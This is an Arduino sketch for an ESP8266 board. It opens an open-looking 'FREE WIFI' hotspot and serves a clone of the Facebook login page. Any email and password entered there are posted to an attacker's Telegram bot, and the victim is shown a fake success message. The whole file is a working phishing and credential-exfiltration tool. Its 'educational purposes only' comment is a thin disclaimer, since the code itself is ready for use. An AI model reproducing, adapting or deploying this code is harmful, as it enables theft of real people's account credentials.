// এই কোডটি শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে ব্যবহারের জন্য।
// যদি আপনি কারো সিস্টেম হ্যাক করতে গিয়ে ধরা খান,
// তাহলে আমাকে দোষ দেবেন না।
// DEV : MD.NAHIDUL ISLAM

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

const char* ssid = "Eng Mase nich";
const char* password = "87654321";

const char* ap_ssid = "FREE WIFI";
const char* ap_password = "12345678";


const String botToken = "TOKEN";
const String chatId = "USERID";

ESP8266WebServer server(80);


void sendToTelegram(String user, String pass) {
  if (WiFi.status() == WL_CONNECTED) {
    WiFiClientSecure client;
    client.setInsecure();
    HTTPClient https;

    String url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
    https.begin(client, url);
    https.addHeader("Content-Type", "application/json");

    String dateTime = __DATE__;
    String timeNow = __TIME__;
    String senderIP = WiFi.localIP().toString();

    String fullMessage = "<b>𓆩𓆩  𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃  ツ.𓆪𓆪 \n\n🐉 ⊚-----------------------------------⊚ 🐉</b>\n"
                         "<b>💬 MAIN INFO : \n📧 ↝ 𝙴𝚖𝚊𝚒𝚕 » </b> <code>" + user + "</code>\n<b>📟 ↝ 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » </b> <code>" + pass + "</code>\n"
                         "<b>🏴 ↝ 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 »</b> <i> BANGLADESH  </i>\n"
                         "<b>⏳ ↝ 𝙲𝚘𝚍𝚎 »</b> <i> +880  </i>\n"
                         "<b>📅 Date:</b> <i>" + dateTime + "</i>\n"
                         "<b>⏱ Time:</b> <i>" + timeNow + "</i>\n"
                         "<b>🌐 IP:</b> <code>" + senderIP + "</code>\n"
                         "<b>🐉</b> <b>⊚-----------------------------------⊚ 🐉</b>\n"
                         "<b>👨‍💻 Developer : </b> <i>MD.NAHIDUL ISLAM</i>\n";

    String payload = "{\"chat_id\":\"" + chatId + "\",\"text\":\"" + fullMessage + "\",\"parse_mode\":\"HTML\"}";
    int code = https.POST(payload);

    Serial.print("Telegram response: ");
    Serial.println(code);
    https.end();
  }
}

const char* loginPage = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Facebook</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{margin:0;background:#f0f2f5;font-family:sans-serif;}
main{display:flex;justify-content:center;align-items:center;min-height:100vh;padding:2rem;}
.main{display:flex;flex-direction:column;align-items:center;}
form{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.2);width:300px;}
form input{width:100%;margin:10px 0;padding:12px;border:1px solid #ccc;border-radius:6px;}
form input[type=submit]{background:#1877f2;color:#fff;font-weight:bold;border:none;}
form input[type=submit]:hover{background:#0f65d3;}
.logo{width:180px;margin-bottom:20px;}
a{text-decoration:none;font-size:14px;color:#1877f2;}
a:hover{text-decoration:underline;}
</style>
</head><body><main><div class="main">
<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo">
<form method="POST" action="/login">
<input type="text" name="Email" placeholder="Email or Phone" required>
<input type="password" name="Password" placeholder="Password" required>
<input type="submit" value="Log In">
<a href="#">Forgotten password?</a>
<hr>
<input type="submit" value="Create New Account" style="background:#42b72a;margin-top:10px;">
</form>
</div></main></body></html>
)rawliteral";

void handleRoot() {
  server.send(200, "text/html", loginPage);
}


void handleLogin() {
  if (server.hasArg("Email") && server.hasArg("Password")) {
    String user = server.arg("Email");
    String pass = server.arg("Password");
    sendToTelegram(user, pass);
    server.send(200, "text/html", "<h3>✅ Login successful! <a href='/'>Return</a></h3>");
  } else {
    server.send(400, "text/plain", "❌ Missing fields!");
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500); Serial.print(".");
  }
  Serial.println("\n✅ WiFi connected. IP: " + WiFi.localIP().toString());

  WiFi.softAP(ap_ssid, ap_password);
  Serial.println("✅ AP Mode Started\nAP IP: " + WiFi.softAPIP().toString());

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.begin();
  Serial.println("✅ HTTP server started");
}

void loop() {
  server.handleClient();
}
// CODE WITH MD.NAHIDUL ISLAM
